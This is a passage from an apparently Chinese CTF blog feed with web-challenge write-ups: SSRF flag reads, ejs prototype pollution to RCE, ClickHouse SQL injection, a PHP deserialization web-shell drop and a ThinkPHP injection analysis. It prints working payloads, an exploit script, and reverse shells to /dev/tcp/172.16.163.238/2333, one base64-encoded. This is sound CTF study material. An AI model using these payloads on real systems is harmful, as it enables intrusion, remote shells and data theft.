in.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>            content.append(inputLine);<br>            content.append(<span class="hljs-string">&quot;n&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> content;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight delphi"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs delphi">url=url:<span class="hljs-keyword">file</span>:<span class="hljs-comment">///flag</span><br>æˆ–<br>url=<span class="hljs-number">%00</span><span class="hljs-keyword">file</span>:<span class="hljs-comment">///flag</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a3103c40e8dc40a88146d80c99f1eba3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GKcctf</title>
    <link href="/2021/11/01/2021-11-GKCTF2021/"/>
    <url>/2021/11/01/2021-11-GKCTF2021/</url>
    
    <content type="html"><![CDATA[<h1 id="Eznode"><a href="#Eznode" class="headerlink" title="Eznode"></a>Eznode</h1><p>è€ƒç‚¹ä¸ºjså¼±ç±»å‹æ¯”è¾ƒï¼ŒejsåŸå‹é“¾æ±¡æŸ“rce</p><p>åŸç†å‚è€ƒejsåŸå‹é“¾æ±¡æŸ“rce</p><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p><p><a href="https://blog.szfszf.top/tech/javascript-%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93-%e5%88%86%e6%9e%90/">https://blog.szfszf.top/tech/javascript-%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93-%e5%88%86%e6%9e%90/</a></p><p>å®¡è®¡æºç å‘ç°å­˜åœ¨</p><p>ä¸€ä¸ª<code>login</code>ç™»å½•å¹¶ä¸”æœ‰ç™½åå•è¿‡æ»¤ï¼Œ</p><p>ç™»å½•åå­˜åœ¨tokenè®¤è¯</p><p>å¯ä»¥åœ¨<code>/addAdmin</code>ä¸‹æ·»åŠ adminè´¦æˆ·</p><p>æœ€åå¯ä»¥åœ¨ä¸çŸ¥é“åœ¨å¹²å•¥çš„<code>adminDIV</code>è·¯ç”±å‘ç°åŸå‹é“¾æ±¡æŸ“æ¼æ´ï¼Œè¿™é‡Œçš„<code>extend</code>æ–¹æ³•ä¼šå°†ç¬¬äºŒä¸ªå‚æ•°<code>JSON.parse(addDIV)</code>å‹å…¥åˆ°ç¬¬ä¸€ä¸ªå‚æ•°ä¸­ï¼Œè¿™é‡Œè¿˜ç‰¹åˆ«ç”¨äº†<code>JSON.parse</code>é˜²æ­¢äº†<code>__proto__</code>è¢«å½“ä½œåŸå‹ã€‚</p><p><img src="https://img-blog.csdnimg.cn/977632bb08cc424bb003e551981d48be.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœ¬åœ°æµ‹è¯•äº†ä¸€ä¸‹</p><p><img src="https://img-blog.csdnimg.cn/26570674c40e4f12a198de84f9d7218a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç¬¬äºŒä¸ªæ¼æ´ç‚¹åœ¨äº<code>ejs</code>çš„æ¨¡æ¿å¼•æ“rceï¼Œéœ€è¦å€ŸåŠ©ç¬¬ä¸€æ­¥çš„åŸå‹é“¾æ±¡æŸ“å®ç°</p><p><code>&#123;&#39;__proto__&#39;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.16.163.238 /2333 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p><p>ä½†æ˜¯è¦è¿›å…¥<code>adminDIV</code>éœ€è¦è¿›è¡Œç™»å½•ï¼Œç™»å½•ä¸­éœ€è¦ç»•è¿‡ç™½åå•ï¼Œè¿™ä¸ªè€ƒçš„æ˜¯jså¼±ç±»å‹ï¼Œæ•°ç»„çœŸçš„æ˜¯åœ¨ä»»ä½•é¢˜ç›®éƒ½å¯èƒ½è€ƒåˆ°çš„ä¸œè¥¿ï¼Œè™½ç„¶è¿™ä¸ªç‚¹ä¸å¤§ï¼Œä½†ä»¥åä¸€å®šè¦ç»å¸¸è®°èµ·æ¥è¿™ä¸ªä¸œè¥¿ï¼Œä¸ç„¶å°±ä¼šå¡åŠå¤©ã€‚è¿™é‡Œè¿‡æ»¤çš„é€»è¾‘æ˜¯</p><p>åœ¨ç™½åå•<code>blacklist = [&#39;\\&#39;,&#39;\^&#39;,&#39;)&#39;,&#39;(&#39;,&#39;\&quot;&#39;,&#39;\&#39;&#39;]</code>ä¸­éå†ï¼Œå½“ç”¨æˆ·è¾“å…¥ä¸­æœ‰ç™½åå•ä¸­çš„å­—ç¬¦åˆ™è®©è¿™ä¸ªå­—ç¬¦å˜æˆ<code>*</code>ã€‚</p><p>è¿™é‡Œå¯ä»¥æƒ³å¦‚æœæˆ‘ä»¬è¾“å…¥çš„å‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆ<code>str[i]</code>å°±æ˜¯ä¸€ä¸ªå­—ç¬¦ï¼Œåˆ™<code>if (waf(str[i]) ==&quot;*&quot;)</code>è‚¯å®šä¸ºfalseï¼Œä»è€Œç»•è¿‡ï¼Œä½†æ˜¯è¿™æ ·è¿›è¡ŒsqlæŸ¥è¯¢æ—¶ï¼Œæ•°ç»„æ²¡æœ‰substræ–¹æ³•ä¼šæŠ¥é”™ï¼Œå¯ä»¥çœ‹åˆ°ifé‡Œé¢è¿˜æœ‰ä¸ªæ‹¼æ¥æ“ä½œï¼Œåœ¨jsä¸­æ•°ç»„åŠ ä¸Šå­—ç¬¦ä¸²æœ€åç»“æœæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä»ç„¶éœ€è¦è¿›å…¥ifè¯­å¥ä¸­ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ€è·¯å°±æ˜¯æ„é€ ä¸€ä¸ªæ•°ç»„ä½†æ˜¯æ•°ç»„é‡Œé¢ä¼šå«æœ‰ç™½åå•ä¸­çš„å­—ç¬¦ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> waf = <span class="hljs-function">(<span class="hljs-params">str</span>)=&gt;</span>&#123;<br>       blacklist = [<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>,<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>]<br>       blacklist.forEach(<span class="hljs-function"><span class="hljs-params">element</span> =&gt;</span> &#123;<br>           <span class="hljs-keyword">if</span> (str == element)&#123;<br>               str = <span class="hljs-string">&quot;*&quot;</span>;<br>           &#125;<br>       &#125;);<br>       <span class="hljs-keyword">return</span> str;<br>   &#125;<br><br>   <span class="hljs-keyword">const</span> safeStr = <span class="hljs-function">(<span class="hljs-params">str</span>)=&gt;</span>&#123; <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;i &lt; str.length;i++)&#123;<br>       <span class="hljs-keyword">if</span> (waf(str[i]) ==<span class="hljs-string">&quot;*&quot;</span>)&#123;<br>           <br>           str =  str.slice(<span class="hljs-number">0</span>, i) + <span class="hljs-string">&quot;*&quot;</span> + str.slice(i + <span class="hljs-number">1</span>, str.length);<br>       &#125;<br>       <br>   &#125;<br></code></pre></div></td></tr></table></figure><p>æ„é€ payloadï¼Œè¿™é‡Œusernameé•¿åº¦å¾—è¶³å¤Ÿå› ä¸ºåé¢è¿˜æœ‰substræ–¹æ³•</p><p><code>username[]=admin&#39;#&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=(&amp;password=123456    </code></p><p>è¿™æ ·æœ€åç»“æœå°±æ˜¯</p><p><img src="https://img-blog.csdnimg.cn/441ad71931b54ccea4d23a414367b0b2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ”¹åŒ…å‘é€å¾—åˆ°token</p><p><img src="https://img-blog.csdnimg.cn/8cf203044c9a4c2cbb17df42d85c0a4d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç”¨å¾—åˆ°çš„tokenæ·»åŠ adminç”¨æˆ·ï¼Œæ³¨æ„è®©æ·»åŠ çš„ç”¨æˆ·åä¸º<code>__proto__</code>ï¼Œç„¶åç”¨æ·»åŠ æˆåŠŸçš„adminç”¨æˆ·ç™»å½•ç„¶åè¿›è¡ŒåŸå‹æ±¡æŸ“ã€‚ç”¨æ–°ç”¨æˆ·ç™»å½•ä¸­ç›´æ¥ç™»å½•å°±ä¸è¡Œï¼Œéå¾—ç”¨hackbarï¼ŒçœŸä¸çŸ¥é“ä¸ºå•¥ã€‚</p><p><img src="https://img-blog.csdnimg.cn/dc3867f9e44d49818444c4a2481d99fe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‹¿åˆ°æ–°ç”¨æˆ·tokenåè¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œç„¶åè®¿é—®adminé¡µé¢è¿›å…¥ ejs æ¸²æŸ“å¼•æ“getshellï¼Œbuuå†…ç½‘é¶æœºç›‘å¬ã€‚</p><p><code>data=&#123;&#39;__proto__&#39;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNi4xNjMuMjM4LzIzMzMgMD4mMQo= | base64 -d | bash&#39;);var __tmp2&quot;&#125;&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å­—èŠ‚è·³åŠ¨</title>
    <link href="/2021/11/01/2021-10-bytectf%E5%88%9D%E8%B5%9B/"/>
    <url>/2021/11/01/2021-10-bytectf%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="Double-Sqli"><a href="#Double-Sqli" class="headerlink" title="Double Sqli"></a>Double Sqli</h2><p>æœ¬èœåšäº†å¾ˆé•¿æ—¶é—´æ‰å”¯ä¸€åšå‡ºæ¥çš„ä¸€é“é¢˜ã€‚æŠ¥é”™å¯ä»¥å‘ç°æ˜¯clickhouseæ•°æ®åº“ï¼ŒæŸ¥çœ‹æ–‡æ¡£å¯ä»¥æŸ¥æ•°æ®åº“ï¼Œè¡¨ç­‰</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">&#x2F;?id&#x3D;-1 union all select name from system.databases--+<br></code></pre></div></td></tr></table></figure><p>æœ€åè¯»åˆ°hint,æç¤ºéœ€è¦ææƒã€‚</p><p><img src="https://img-blog.csdnimg.cn/f452ef603b2e4e269037545b674e9e24.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œéœ€è¦å‘ç°ä¸€ä¸ª nginx ç›®å½•ç©¿è¶Š</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">åœ¨ <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/clickhouse/</span>access/xxxx.sql ä¸­å‘ç°äº†æ•°æ®åº“ä¸­è¿˜æœ‰ä¸€ä¸ª user_01 ç”¨æˆ·ï¼Œå…¶å¯†ç ä¸º e3b0c44298fc1c149afb<br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œè‚¯å®šæ˜¯ç”¨<code>user_01</code>çš„æƒé™è¯»å–flagï¼Œåé¢å‘ç°å¯ä»¥ç”¨<code>url()</code>å‡½æ•°ssrfæ‰“å®ƒæœ¬åœ°çš„clickhouse</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><br>test = <span class="hljs-string">&#x27;http://39.105.175.150:30001&#x27;</span><br>param = &#123;<br>    <span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;-1 union all select * FROM url(&#x27;http://localhost:8123?user=user_01&amp;password=e3b0c44298fc1c149afb&amp;query=select+flag+from+flag&#x27;,&#x27;CSV&#x27;,&#x27;column1 String&#x27;)&quot;</span><br>&#125;<br><br>res = requests.get(test,params=param)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></div></td></tr></table></figure><h1 id="Unsecure-Blog"><a href="#Unsecure-Blog" class="headerlink" title="Unsecure Blog"></a>Unsecure Blog</h1><p>ä¸‡æ¶çš„javaé¢˜ç›®ï¼Œæ„Ÿè§‰javaè™½ç„¶å¾ˆä¸¥è°¨ä½†çœŸçš„å¾ˆéš¾ã€‚</p><h1 id="easy-extract"><a href="#easy-extract" class="headerlink" title="easy_extract"></a>easy_extract</h1><h1 id="sp-oauth"><a href="#sp-oauth" class="headerlink" title="sp-oauth"></a>sp-oauth</h1>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç»¿åŸæ¯</title>
    <link href="/2021/10/30/2021-10-%E7%BB%BF%E5%9F%8E%E6%9D%AF/"/>
    <url>/2021/10/30/2021-10-%E7%BB%BF%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="Looking-for-treasure"><a href="#Looking-for-treasure" class="headerlink" title="Looking for treasure"></a>Looking for treasure</h1><p>json-schemaåŸå‹é“¾</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http">POST /validated/json-schema/validate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br>&#123;&quot;$schema&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;outputFunctionName&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;x;var buf = Buffer.alloc(128);var fs = process.mainModule.require(`fs`);var fd=fs.openSync(`/fl`+`ag`);fs.readSync(fd, buf, 0, 128);fs.closeSync(fd);return buf.toString();//x&quot;&#125;,&quot;path&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;/foo&quot;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¤©ç¿¼æ¯å¤ç°</title>
    <link href="/2021/10/10/2021-10-%E5%A4%A9%E7%BF%BC%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/10/10/2021-10-%E5%A4%A9%E7%BF%BC%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="easy-eval"><a href="#easy-eval" class="headerlink" title="easy_eval"></a>easy_eval</h1><p>è¿›å…¥é¦–å…ˆæ˜¯ä¸€ä¸ªååºåˆ—åŒ–åŠ ç»•è¿‡ï¼Œè¿™é‡Œå¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡å’ŒåŸºç±»ç»•è¿‡ï¼Œwakeupæ”¹å±æ€§å°±è¡Œ</p><p>å°†æ­£å¸¸payload</p><p><code>O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:64:&quot;file_put_contents(&#39;./shell.php&#39;,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);&quot;;&#125;&#125;</code></p><p>æ”¹ä¸º</p><p><code>O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:64:&quot;file_put_contents(&#39;./shell.php&#39;,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);&quot;;&#125;&#125;</code></p><p>ç½‘ä¸Šä¸€äº›å¸ˆå‚…è¿˜æä¾›äº†åŸºç±»çš„ç»•è¿‡</p><p><code>O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;test&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;</code></p><p>è¿˜å¯ä»¥çœç•¥æœ«å°¾çš„å¤§æ‹¬å·,callæåˆ°wakeupå‰ç»•è¿‡</p><p><code>O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p><p>ç”¨èšå‰‘è„¸ä¸Šä¹‹åç»ˆç«¯æ˜¯æ²¡æœ‰å‘½ä»¤æƒé™çš„ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°swpæ–‡ä»¶ï¼Œvimçœ‹ä¸€ä¸‹å‘ç°å’Œredisæ•°æ®åº“æœ‰å…³ï¼Œå¹¶ä¸”ç»™äº†å¯†ç ã€‚</p><p><img src="https://img-blog.csdnimg.cn/caa0927d818f4571ad43437ddffd911d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¼€å¯äº†rediså°±å¾ˆæ˜¾ç„¶äº†ï¼Œç”¨ç»™çš„å¯†ç è®¤è¯è¿æ¥redisï¼Œä¸Šä¼ .soæ–‡ä»¶ï¼ŒmoudleåŠ è½½æ‰§è¡Œå‘½ä»¤å³å¯ã€‚</p><h1 id="Eztp"><a href="#Eztp" class="headerlink" title="Eztp"></a>Eztp</h1><p>thinkPHPæºç å®¡è®¡ï¼Œè€ƒçš„æ˜¯5.0.4ç‰ˆæœ¬<code>select</code>æ–¹æ³•æ¼æ´</p><p>åŸç†å¯å‚è€ƒ<a href="https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83">https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83</a></p><p>è¿™é‡Œç®€å•å¤ç°äº†ä¸€ä¸‹æ¼æ´ï¼Œå…¥å£indexä»£ç å¦‚ä¸‹ã€‚ThinkPHP5.0ç‰ˆæœ¬é»˜è®¤çš„å˜é‡ä¿®é¥°ç¬¦æ˜¯<code>/s</code>ï¼Œè¿™é‡Œ<code>/a</code>æ„æ€æ˜¯å¦‚æœä½ è¦è·å–çš„æ•°æ®ä¸ºæ•°ç»„ï¼Œéœ€è¦ç”¨<code>/a</code>æ‰èƒ½è½¬æ¢</p><p><img src="https://img-blog.csdnimg.cn/9603ff8a29f94539ad8cd57823366ddb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…ˆè¿›è¡Œæ•°æ®åº“åˆå§‹åŒ–ï¼Œç„¶åè¿›å…¥<code>where</code>å‡½æ•°</p><p><img src="https://img-blog.csdnimg.cn/302b8ff89f6a4278a45f7999de060b6d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‡ºwhereæ–¹æ³•å<code>$options</code>é‡Œå¤šäº†ä¸¤ä¸ªæ•°ç»„ã€‚</p><p>ä¹‹åè¿›å…¥å…³é”®çš„<code>select</code>å‡½æ•°ï¼Œå…³é”®åœ¨ç”Ÿæˆsqlè¯­å¥çš„è¿‡ç¨‹ã€‚åœ¨ <strong>select</strong> æ–¹æ³•ä¸­ï¼Œç¨‹åºä¼šå¯¹ <strong>SQL</strong> è¯­å¥æ¨¡æ¿ç”¨å˜é‡å¡«å……ï¼Œå…¶ä¸­ç”¨æ¥å¡«å…… <strong>%WHERE%</strong> çš„å˜é‡ä¸­å­˜åœ¨ç”¨æˆ·è¾“å…¥çš„æ•°æ®ã€‚æˆ‘ä»¬è·Ÿè¿›è¿™ä¸ª <strong>where</strong> åˆ†æå‡½æ•°ï¼Œä¼šå‘ç°å…¶ä¼šè°ƒç”¨ç”ŸæˆæŸ¥è¯¢æ¡ä»¶ <strong>SQL</strong> è¯­å¥çš„ <strong>buildWhere</strong> å‡½æ•°ã€‚</p><p><img src="https://img-blog.csdnimg.cn/3cd95db4dd724a4287e5f43090fa5f56.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¼æ´äº§ç”Ÿåœ°æ–¹åœ¨äºæ£€æµ‹æ“ä½œç¬¦çš„è¿‡ç¨‹,è¿™é‡Œå¯ä»¥çœ‹åˆ°æ£€æµ‹ã€‚å½“<code>$this-&gt;exp[$exp]</code>ä¸­å«æœ‰<code>not like</code>æ—¶ä¼šå°†ç”¨æˆ·æ§åˆ¶çš„å˜é‡ç›´æ¥è¿›è¡Œèµ‹å€¼ã€‚</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211011212308025.png" alt="image-20211011212308025"></p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211011212902036.png" alt="image-20211011212902036"></p><p>åé¢å°±æ„é€ æˆäº†æˆ‘ä»¬æƒ³è¦çš„payloadï¼Œæ‹¿ä¸€å¼ ç½‘ä¸Šçš„å›¾</p><p><img src="https://mochazz.github.io/img/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/7.png" alt="img"></p><blockquote><p>æ­£æ˜¯ç”±äº <strong>ThinkPHP</strong> å®˜æ–¹çš„ <strong>filterValue</strong> æ–¹æ³•æ¼è¿‡æ»¤äº† <strong>NOT LIKE</strong> ï¼ŒåŒæ—¶ <strong>MYSQL</strong> é€»è¾‘æ“ä½œç”±ç”¨æˆ·å˜é‡æ§åˆ¶ï¼Œä½¿å¾—è¿™ä¸€æ¼æ´å¯ä»¥è¢«åˆ©ç”¨ã€‚</p></blockquote><p>æ”»å‡»ç»“æœ</p><p><img src="https://img-blog.csdnimg.cn/569aadf8084f433e89fbeb72899d15d3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½†æ˜¯nssé¶åœºçš„é¢˜ç›®ç¯å¢ƒä¼¼ä¹æœ‰ç‚¹é—®é¢˜ï¼Œæ³¨å…¥è¿›ä¸åˆ°åå°ã€‚ç›´æ¥çœ‹åé¢çš„ååºåˆ—åŒ–å§</p><p>å‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/251318#h2-1">https://www.anquanke.com/post/id/251318#h2-1</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nodejs</title>
    <link href="/2021/10/08/2021-10-nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8(1)/"/>
    <url>/2021/10/08/2021-10-nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8(1)/</url>
    
    <content type="html"><![CDATA[<h3 id="æ²™ç®±æœºåˆ¶"><a href="#æ²™ç®±æœºåˆ¶" class="headerlink" title="æ²™ç®±æœºåˆ¶"></a>æ²™ç®±æœºåˆ¶</h3><p>æ²™ç®±æœºåˆ¶ç®€å•æ¥è®²æ˜¯ä¸€ä¸ªéš”ç¦»å¾—è™šæ‹Ÿç¯å¢ƒï¼Œèƒ½å¤Ÿç‹¬ç«‹çš„åœ¨è¿™ä¸ªè™šæ‹Ÿç¯å¢ƒå†…è¿è¡Œä»£ç ï¼Œä½†æ˜¯ä¸ä¼šå½±å“å¤–ç•Œä»£ç ï¼Œèƒ½å¤Ÿå±è”½ä¸Šä¸‹æ–‡ï¼Œéš”ç¦»å½“å‰çš„æ‰§è¡Œç¯å¢ƒï¼Œé¿å…è¢«æ¶æ„ä»£ç æ”»å‡»ã€‚</p><p>æ—¥å¸¸å¼€å‘éœ€æ±‚ä¸­æœ‰æ—¶å€™ä¸ºäº†è¿½æ±‚çµæ´»æ€§æˆ–é™ä½å¼€å‘éš¾åº¦ï¼Œä¼šåœ¨ä¸šåŠ¡ä»£ç é‡Œç›´æ¥ä½¿ç”¨ eval/Function/vm ç­‰åŠŸèƒ½ï¼Œå…¶ä¸­ eval/Function ç®—æ˜¯åŠ¨æ€æ‰§è¡Œ JSï¼Œä½†æ— æ³•å±è”½å½“å‰æ‰§è¡Œç¯å¢ƒçš„ä¸Šä¸‹æ–‡ï¼Œä¼šå­˜åœ¨å®‰å…¨é—®é¢˜ã€‚ node.js é‡Œæä¾›äº† vm æ¨¡å—ï¼Œç›¸å½“äºä¸€ä¸ªè™šæ‹Ÿæœºï¼Œå¯ä»¥è®©ä½ åœ¨æ‰§è¡Œä»£ç 